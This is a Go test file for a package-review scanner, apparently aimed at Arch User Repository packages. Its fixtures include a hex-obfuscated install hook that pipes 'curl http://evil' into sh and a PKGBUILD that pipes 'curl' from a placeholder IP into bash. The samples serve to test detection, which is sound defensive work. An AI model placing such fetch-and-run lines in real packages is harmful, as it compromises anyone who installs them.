package review

import (
	"strings"
	"testing"

	"caur/internal/aur"
)

func TestHeuristicsFlagsObfuscatedInstallHook(t *testing.T) {
	// Mirrors the real AUR compromise: an obfuscated command hidden in a
	// post_install hook via hex/octal escapes.
	pf := aur.PkgFiles{
		PkgBase: "evil",
		Files: map[string]string{
			"evil.install": `post_install() {
  printf '\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c' | sh
}`,
		},
	}
	findings, note := Heuristics(pf)
	if len(findings) == 0 {
		t.Fatal("expected the obfuscated install hook to be flagged")
	}
	if findings[0].Severity != "critical" {
		t.Errorf("install-hook obfuscation should be critical, got %q", findings[0].Severity)
	}
	if !strings.Contains(note, "evil.install") {
		t.Errorf("note should reference the offending file, got %q", note)
	}
}

func TestHeuristicsFlagsPipeToShell(t *testing.T) {
	pf := aur.PkgFiles{
		PkgBase: "tool",
		Files: map[string]string{
			"PKGBUILD": "build() {\n  curl -s http://203.0.113.9/x | bash\n}\n",
		},
	}
	findings, _ := Heuristics(pf)
	if len(findings) == 0 {
		t.Fatal("expected curl|bash to be flagged")
	}
}

func TestHeuristicsCleanPKGBUILD(t *testing.T) {
	pf := aur.PkgFiles{
		PkgBase: "ok",
		Files: map[string]string{
			"PKGBUILD": `pkgname=ok
pkgver=1.0
source=("https://example.org/ok-$pkgver.tar.gz")
sha256sums=('abc')
build() { cd "$srcdir/ok-$pkgver"; make; }
package() { make DESTDIR="$pkgdir" install; }
`,
		},
	}
	findings, _ := Heuristics(pf)
	if len(findings) != 0 {
		t.Errorf("legitimate PKGBUILD should not be flagged, got %d findings: %+v", len(findings), findings)
	}
}
